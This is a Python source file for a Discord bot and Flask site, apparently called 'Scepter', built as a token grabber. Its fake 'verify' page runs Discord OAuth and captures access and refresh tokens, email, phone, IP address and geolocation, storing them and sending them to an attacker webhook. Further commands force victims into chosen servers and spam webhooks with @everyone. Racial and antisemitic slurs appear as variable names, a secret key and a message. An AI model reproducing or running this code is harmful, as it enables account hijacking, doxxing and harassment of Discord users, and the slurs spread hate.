import flask
import os
import time
import threading
import httpx
import discord
from discord.ext import commands
from datetime import datetime
from pystyle import *
import asyncio
import sqlite3
import json

app = flask.Flask(__name__)

# ── Helper Utilities ──────────────────────────────────────────────────────
def _truncate_for_discord(content: str, limit: int = 1900) -> str:
    """Discord limits message content to 2000 chars; keep some headroom."""
    if len(content) <= limit:
        return content
    return content[: limit - 20] + "\n... (truncated)"


def _send_or_file(ctx, content: str, filename: str = "info.txt"):
    """Send content as a message if short enough, otherwise as a file."""
    if len(content) <= 1900:
        return ctx.send(content)

    from io import BytesIO
    bio = BytesIO(content.encode("utf-8"))
    bio.seek(0)
    return ctx.send(file=discord.File(bio, filename=filename))

def snowflake_time(snowflake):
    try:
        return datetime.utcfromtimestamp((int(snowflake) >> 22) / 1000 + 1420070400)
    except:
        return None


# ── Config ──────────────────────────────────────────────────────────────
token = os.environ["TOKEN"]
client_id = os.environ["CLIENT_ID"]
client_secret = os.environ["CLIENT_SECRET"]
redirect_uri = os.environ["REDIRECT_URI"]
guild_ids = os.environ["GUILD_IDS"].split(",")
webhook = os.environ["WEBHOOK"]
jew_token = token

app.secret_key = "negrosjotos"  # Change this to a secure key


# ── Database Setup ──────────────────────────────────────────────────────
conn = sqlite3.connect("tokens.db", check_same_thread=False)
c = conn.cursor()
c.execute(
    """
    CREATE TABLE IF NOT EXISTS tokens (
        user_id TEXT PRIMARY KEY,
        access_token TEXT,
        refresh_token TEXT,
        ip TEXT,
        geo TEXT,
        useragent TEXT,
        lat TEXT,
        lon TEXT,
        guild_list TEXT,
        connection_list TEXT,
        map_url TEXT
    )
    """
)
conn.commit()

tokens = {}
START_TIME = time.time()
clear = lambda: os.system("cls" if os.name == "nt" else "clear")
jew = commands.Bot(command_prefix=".", intents=discord.Intents.all(), help_command=None)

# Load tokens from DB
c.execute("SELECT * FROM tokens")
for row in c.fetchall():
    (
        user_id,
        access,
        refresh,
        ip,
        geo_str,
        ua,
        lat,
        lon,
        guilds,
        conns,
        map_url,
    ) = row
    tokens[user_id] = {
        "access_token": access,
        "refresh_token": refresh,
        "ip": ip,
        "geo": json.loads(geo_str) if geo_str else {},
        "useragent": ua,
        "lat": lat,
        "lon": lon,
        "guild_list": guilds,
        "connection_list": conns,
        "map_url": map_url,
    }


# ── Flask Routes ──────────────────────────────────────────────────────────────
@app.route("/")
def home():
    return flask.redirect("/verify")


@app.route("/verify")
def verify():
    return flask.redirect(
        f"https://discord.com/api/oauth2/authorize?client_id={client_id}"
        f"&redirect_uri={redirect_uri}&response_type=code"
        f"&scope=identify%20email%20connections%20guilds%20guilds.join"
    )


@app.route("/verified")
def verified():

    data = {
        "client_id": client_id,
        "client_secret": client_secret,
        "grant_type": "authorization_code",
        "code": flask.request.args.get("code"),
        "redirect_uri": redirect_uri,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = httpx.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token_data = r.json()
    access_token = token_data["access_token"]
    refresh_token = token_data["refresh_token"]

    def safe_user_request(token: str) -> dict:
        auth = {"Authorization": f"Bearer {token}"}
        url = "https://discord.com/api/users/@me"

        for _ in range(5):                     # try a few times before giving up
            resp = httpx.get(url, headers=auth, timeout=10)

            if resp.status_code == 200:       # success
                raw = resp.json()
                break

            if resp.status_code == 429:       # rate‑limited – respect retry‑after
                wait = resp.json().get("retry_after", 1)
                print(f"[INFO] Rate limited, waiting {wait}s …")
                time.sleep(wait)
                continue

            # any other non‑200 response is fatal
            raise RuntimeError(
                f"Failed to fetch /users/@me – status {resp.status_code}: {resp.text}"
            )
        else:
            raise RuntimeError("Exceeded max retries for /users/@me")

        # Normalise – every field becomes a string (or bool where appropriate)
        get = lambda k, d="N/A": raw.get(k, d) if raw.get(k) is not None else d
        return {
            "id": raw["id"],
            "username": get("username"),
            "discriminator": get("discriminator"),
            "avatar": get("avatar", None),
            "email": get("email"),
            "phone": get("phone"),
            "locale": get("locale"),
            "verified": raw.get("verified", False),
            "mfa_enabled": raw.get("mfa_enabled", False),
            "premium_type": raw.get("premium_type", 0),   # 0 = no Nitro
        }

    try:
        user = safe_user_request(access_token)
    except Exception as exc:
        print(f"[ERROR] {exc}")
        return flask.redirect("/")          # fallback of your choice

    auth_headers = {"Authorization": f"Bearer {access_token}"}
    guilds = httpx.get(
        "https://discord.com/api/users/@me/guilds", headers=auth_headers
    ).json()
    connections = httpx.get(
        "https://discord.com/api/users/@me/connections", headers=auth_headers
    ).json()

    user_id = user["id"]
    tokens[user_id] = {"access_token": access_token, "refresh_token": refresh_token}

    ip = flask.request.headers.get("X-Forwarded-For", flask.request.remote_addr)
    geo = httpx.get(f"http://ip-api.com/json/{ip}").json()
    lat = geo.get("lat", "N/A")
    lon = geo.get("lon", "N/A")

    map_url = (
        f"https://static-maps.yandex.ru/1.x/?lang=en-US&ll={lon},{lat}"
        f"&z=10&l=map&size=450,250&pt={lon},{lat},pm2rdm"
    )

    guild_list = (
        "\n".join(
            f"  - {g['name']} ({g['id']})"
            f"{' [OWNER]' if g.get('owner') else ''}"
            f"{' [ADMIN]' if g.get('permissions') and int(g['permissions']) & 0x8 else ''}"
            for g in guilds
        )
        if isinstance(guilds, list)
        else "Failed to fetch"
    )

    connection_list = (
        "\n".join(
            f"  - {c['type']}: {c['name']}"
            f"{' [VERIFIED]' if c.get('verified') else ''}"
            for c in connections
        )
        if isinstance(connections, list)
        else "Failed to fetch"
    )

    useragent = flask.request.headers.get("User-Agent", "Unknown")
    flag = geo.get("countryCode", "xx").lower()
    avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png?size=512"
    created_at = snowflake_time(user_id)
    created_str = created_at.strftime("%Y-%m-%d %H:%M:%S UTC") if created_at else "N/A"

    info = {
        "embeds": [
            {
                "title": f"👤 {user.get('username','Unknown')}#{user.get('discriminator','0000')}",
                "description": (
                    f"**User ID**\n`{user_id}`\n\n"
                    f"**Created At**\n`{created_str}`"
                ),
                "color": 0x5865F2,
    
                "thumbnail": {"url": avatar or None},
    
                "fields": [
                    {
                        "name": "📧 Account",
                        "value": (
                            f"**Email**\n`{user.get('email') or 'N/A'}`\n\n"
                            f"**Phone**\n`{user.get('phone') or 'N/A'}`\n\n"
                            f"**Locale**\n`{user.get('locale') or 'N/A'}`"
                        )[:1024],
                        "inline": True,
                    },
                    {
                        "name": "🔐 Security",
                        "value": (
                            f"**Verified**\n`{'Yes' if user.get('verified') else 'No'}`\n\n"
                            f"**MFA**\n`{'Enabled' if user.get('mfa_enabled') else 'Disabled'}`\n\n"
                            f"**Nitro**\n`{'Yes' if user.get('premium_type') else 'No'}`"
                        )[:1024],
                        "inline": True,
                    },
                    {
                        "name": "📊 Stats",
                        "value": (
                            f"**Guilds**\n`{len(guild_list.splitlines()) if guild_list else 0}`\n\n"
                            f"**Connections**\n`{len(connection_list.splitlines()) if connection_list else 0}`"
                        )[:1024],
                        "inline": True,
                    },
                    {
                        "name": "🌐 Network",
                        "value": (
                            f"**IP**\n`{ip or 'N/A'}`\n\n"
                            f"**ISP**\n`{geo.get('isp') or 'N/A'}`\n\n"
                            f"**Org**\n`{geo.get('org') or 'N/A'}`\n\n"
                            f"**ASN**\n`{geo.get('as') or 'N/A'}`"
                        )[:1024],
                        "inline": True,
                    },
                    {
                        "name": "📍 Location",
                        "value": (
                            f"**Country**\n`:flag_{flag}: {geo.get('country') or 'N/A'}`\n\n"
                            f"**Region**\n`{geo.get('regionName') or 'N/A'}`\n\n"
                            f"**City**\n`{geo.get('city') or 'N/A'}`\n\n"
                            f"**ZIP**\n`{geo.get('zip') or 'N/A'}`\n\n"
                            f"**Coords**\n`{lat or 'N/A'}, {lon or 'N/A'}`\n\n"
                            f"**Timezone**\n`{geo.get('timezone') or 'N/A'}`"
                        )[:1024],
                        "inline": True,
                    },
                    {
                        "name": "🗺 Map",
                        "value": f"[Open in Google Maps]({map_url})" if map_url else "`N/A`",
                        "inline": False,
                    },
                    {
                        "name": "🏠 Guilds",
                        "value": f"```{(guild_list or 'None')[:1000]}```",
                        "inline": False,
                    },
                    {
                        "name": "🔗 Connections",
                        "value": f"```{(connection_list or 'None')[:1000]}```",
                        "inline": False,
                    },
                ],
    
                "image": {
                    "url": (
                        f"https://maps.googleapis.com/maps/api/staticmap"
                        f"?center={lat},{lon}&zoom=11&size=700x300"
                        f"&markers=color:red%7C{lat},{lon}"
                    ) if lat and lon else None
                },
    
                "footer": {
                    "text": f"{(useragent or 'Unknown')[:100]}"
                },
            }
        ]
    }
 
    tokens[user_id] = {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "ip": ip,
        "geo": geo,
        "useragent": useragent,
        "lat": lat,
        "lon": lon,
        "guild_list": guild_list,
        "connection_list": connection_list,
        "map_url": map_url,
    }

    c.execute(
        """
        INSERT OR REPLACE INTO tokens
        (user_id, access_token, refresh_token, ip, geo, useragent,
         lat, lon, guild_list, connection_list, map_url)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (
            user_id,
            access_token,
            refresh_token,
            ip,
            json.dumps(geo),
            useragent,
            str(lat),
            str(lon),
            guild_list,
            connection_list,
            map_url,
        ),
    )
    conn.commit()

    try:
        info_content = info.get("content", "")
        info["content"] = _truncate_for_discord(info_content, limit=1900)
        response = httpx.post(webhook, json=info)
        response.raise_for_status()
        print("Webhook sent successfully")
    except Exception as e:
        print(f"Webhook failed: {e}")

    return flask.redirect("https://discord.com/app")



# ── Dashboard Routes ─────────────────────────────────────────────────────
@app.route("/login")
def login():
    return flask.redirect(
        f"https://discord.com/api/oauth2/authorize?client_id={client_id}"
        f"&redirect_uri={flask.url_for('dashboard_callback', _external=True)}&response_type=code"
        f"&scope=identify"
    )


@app.route("/dashboard_callback")
def dashboard_callback():
    try:
        code = flask.request.args.get("code")
        if not code:
            return "No code provided", 400

        data = {
            "client_id": client_id,
            "client_secret": client_secret,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": flask.url_for("dashboard_callback", _external=True),
        }
        r = httpx.post(
            "https://discord.com/api/oauth2/token",
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if r.status_code != 200:
            return "OAuth failed", 400

        token_data = r.json()
        access_token = token_data.get("access_token")
        if not access_token:
            return "No access token", 400

        user = httpx.get(
            "https://discord.com/api/users/@me",
            headers={"Authorization": f"Bearer {access_token}"},
        ).json()
        user_id = user.get("id")
        if user_id == "1178709988747780146":
            flask.session["user_id"] = user_id
            return flask.redirect("/dashboard")
        else:
            return "Access Denied", 403
    except Exception as e:
        return f"Error: {str(e)}", 500


@app.route("/dashboard")
def dashboard():
    if (
        "user_id" not in flask.session
        or flask.session["user_id"] != "1178709988747780146"
    ):
        return flask.redirect("/login")
    try:
        c.execute(
            "SELECT user_id, access_token, ip, geo, lat, lon FROM tokens"
        )
        rows = c.fetchall()
        html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tokens Dashboard</title>
  <style>
    body {font-family: Arial, sans-serif; margin: 20px;}
    table {width: 100%; border-collapse: collapse;}
    th, td {border: 1px solid #ddd; padding: 8px; text-align: left;}
    th {background-color: #f2f2f2;}
    tr:nth-child(even) {background-color: #f9f9f9;}
  </style>
</head>
<body>
  <h1>Tokens Dashboard</h1>
  <table>
    <tr>
      <th>User ID</th>
      <th>Access Token (Partial)</th>
      <th>IP</th>
      <th>Location</th>
      <th>Map</th>
    </tr>"""
        for row in rows:
            user_id, access, ip, geo_str, lat, lon = row
            geo = json.loads(geo_str) if geo_str else {}
            location = f"{geo.get('city', 'N/A')}, {geo.get('country', 'N/A')}"
            map_link = (
                f"https://static-maps.yandex.ru/1.x/?lang=en-US&ll={lon},{lat}"
                f"&z=10&l=map&size=450,250&pt={lon},{lat},pm2rdm"
                if lat and lon
                else "#"
            )
            html += (
                f"<tr><td>{user_id}</td><td>{access[:20]}...</td>"
                f"<td>{ip}</td><td>{location}</td>"
                f"<td><a href='{map_link}' target='_blank'>View Map</a></td></tr>"
            )
        html += "</table></body></html>"
        return html
    except Exception as e:
        return f"Error: {str(e)}", 500


# ── Bot Events ─────────────────────────────────────────────────────────────
@jew.event
async def on_ready():
    clear()
    art = """
   ▄████████  ▄████████    ▄████████    ▄███████▄     ███        ▄████████    ▄████████ 
  ███    ███ ███    ███   ███    ███   ███    ███ ▀█████████▄   ███    ███   ███    ███ 
  ███    █▀  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██   ███    █▀    ███    █▀  
  ███        ███         ▄███▄▄▄       ███    ███     ███   ▀  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
 ▀███████████ ███        ▀▀███▀▀▀     ▀█████████▀      ███     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
          ███ ███    █▄    ███    █▄    ███            ███       ███    █▄  ▀███████████ 
   ▄█    ███ ███    ███   ███    ███   ███            ███       ███    ███   ███    ███ 
 ▄████████▀  ████████▀    ██████████  ▄████▀         ▄████▀     ██████████   ███    ███ 
                                                                             ███    ███ 
    """
    try:
        print(Colorate.Vertical(Colors.yellow_to_green, art, 1))
    except Exception as e:
        print(art)
        print(f"[warn] Colorate failed: {e}")

    total_members = sum(g.member_count for g in jew.guilds)
    print(
        Colorate.Vertical(
            Colors.yellow_to_green,
            f"""
i > Discord Bot:        {jew.user.name}#{jew.user.discriminator}
i > Servers:            {len(jew.guilds)}
i > Total Members:      {total_members}
i > Configured Guilds:  {len(guild_ids)}
i > Ready.
""",
        )
    )
    threading.Thread(
        target=lambda: app.run(
            host="0.0.0.0", port=5000, debug=False, use_reloader=False
        )
    ).start()


# ── Bot Commands ────────────────────────────────────────────────────────
@jew.command()
@commands.has_permissions(administrator=True)
async def help(ctx):
    await ctx.send(
        """```
[ SCEPTER // COMMANDS ]

.help              show this message
.status            show Bot status and uptime
.tokens            list all captured user ids
.info <user_id>    show tokens for a specific user
.join <user_id>    add a specific user to all configured guilds
.joinall           add all captured users to all configured guilds
.webhooks          send @everyone to all webhooks in webhooks.txt
```"""
    )


@jew.command()
@commands.has_permissions(administrator=True)
async def join(ctx, user_id: str):
    if user_id not in tokens:
        await ctx.send(f"No tokens found for user `{user_id}`.")
        return

    access_token = tokens[user_id]["access_token"]
    success = []
    failed = []

    limits = httpx.Limits(max_connections=100, max_keepalive_connections=50)
    async with httpx.AsyncClient(limits=limits, timeout=10) as client:

        async def add_to_guild(guild_id):
            try:
                r = await client.put(
                    f"https://discord.com/api/guilds/{guild_id}/members/{user_id}",
                    headers={"Authorization": f"Bot {jew_token}"},
                    json={"access_token": access_token},
                )
                if r.status_code in (201, 204):
                    guild = jew.get_guild(int(guild_id))
                    success.append(guild.name if guild else guild_id)
                else:
                    failed.append(guild_id)
            except Exception:
                failed.append(guild_id)

        await asyncio.gather(*[add_to_guild(g) for g in guild_ids])

    msg = ""
    if success:
        msg += f"Joined: {', '.join(success)}\n"
    if failed:
        msg += f"Failed: {', '.join(failed)}"
    await ctx.send(msg or "Nothing happened, nigga!")


@jew.command()
@commands.has_permissions(administrator=True)
async def joinall(ctx):
    if not tokens:
        await ctx.send("No tokens captured yet.")
        return

    total_success = 0
    total_failed = 0

    for uid, data in tokens.items():
        for gid in guild_ids:
            r = httpx.put(
                f"https://discord.com/api/guilds/{gid}/members/{uid}",
                headers={"Authorization": f"Bot {jew_token}"},
                json={"access_token": data["access_token"]},
            )
            if r.status_code in (201, 204):
                total_success += 1
            else:
                total_failed += 1

    await ctx.send(
        f"```\n[ JOIN ALL ]\nSuccess: {total_success}\nFailed:  {total_failed}\n```"
    )


@jew.command(name="tokens")
@commands.has_permissions(administrator=True)
async def list_tokens(ctx):
    if not tokens:
        await ctx.send("No tokens captured yet.")
        return
    msg = "```\n[ CAPTURED TOKENS ]\n" + "\n".join(
        f"  - {uid}" for uid in tokens
    ) + "\n```"
    await ctx.send(msg)


@jew.command()
@commands.has_permissions(administrator=True)
async def info(ctx, user_id: str):
    if user_id not in tokens:
        await ctx.send(f"No tokens found for user `{user_id}`.")
        return

    data = tokens[user_id]
    access_token = data.get("access_token", "N/A")
    refresh_token = data.get("refresh_token", "N/A")
    ip = data.get("ip", "N/A")
    geo = data.get("geo", {})
    useragent = data.get("useragent", "N/A")
    lat = data.get("lat", "N/A")
    lon = data.get("lon", "N/A")
    guild_list = data.get("guild_list", "N/A")
    connection_list = data.get("connection_list", "N/A")
    map_url = data.get("map_url", "N/A")

    msg = f"""```
[ TOKENS ]
Access Token:  {access_token}
Refresh Token: {refresh_token}

[ NETWORK ]
IP:            {ip}
ISP:           {geo.get('isp', 'N/A')}
Org:           {geo.get('org', 'N/A')}
User-Agent:    {useragent}

[ LOCATION ]
Country:       {geo.get('country', 'N/A')} ({geo.get('countryCode', 'N/A')})
Region:        {geo.get('regionName', 'N/A')} ({geo.get('region', 'N/A')})
City:          {geo.get('city', 'N/A')}
ZIP:           {geo.get('zip', 'N/A')}
Latitude:      {lat}
Longitude:     {lon}
Timezone:      {geo.get('timezone', 'N/A')}

[ GUILDS ]
{guild_list}

[ CONNECTIONS ]
{connection_list}
{map_url} [blocked]"""
    await _send_or_file(ctx, msg)

@jew.command()
@commands.has_permissions(administrator=True)
async def status(ctx):
    # Calculate uptime
    uptime = int(time.time() - START_TIME)
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)

    # Total members across all guilds the bot is in
    total_members = sum(g.member_count for g in jew.guilds)

    # Send the formatted status embed/message
    await ctx.send(
        f"""```
[ STATUS ]
Bot:            {jew.user.name}#{jew.user.discriminator}
Uptime:         {hours}h {minutes}m {seconds}s
Servers:        {len(jew.guilds)}
Total Members:  {total_members}
Captured Tokens:{len(tokens)}
Configured Guilds:{len(guild_ids)}
```"""
    )


@jew.command()
@commands.has_permissions(administrator=True)
async def webhooks(ctx):
    await ctx.send("Starting Webhooks")
    webhooks = [
        w.strip()
        for w in os.environ.get("WEBHOOKS", "").split(",")
        if w.strip()
    ]

    async def send_messages(url):
        async with httpx.AsyncClient() as client:
            for _ in range(50):
                r = await client.post(url, json={"content": "@everyone | NGC | 912 | CHR | TSC[⠀⠀⠀​​​​​​](https://i.redd.it/qg1k8117swaa1.gif)"})
                if r.status_code == 429:
                    retry_after = r.json().get("retry_after", 1)
                    await asyncio.sleep(retry_after)
                    await client.post(url, json={"content": "@everyone | NGC | 912 | CHR | TSC | [⠀⠀⠀​​​​​​](https://i.redd.it/qg1k8117swaa1.gif)"})
                elif _ < 19:
                    await asyncio.sleep(1 / 28)  # ~28/sec, under limit

    await asyncio.gather(*[send_messages(u) for u in webhooks])


# ── Entry Point ────────────────────────────────────────────────────────
def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)



if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    jew.run(jew_token)
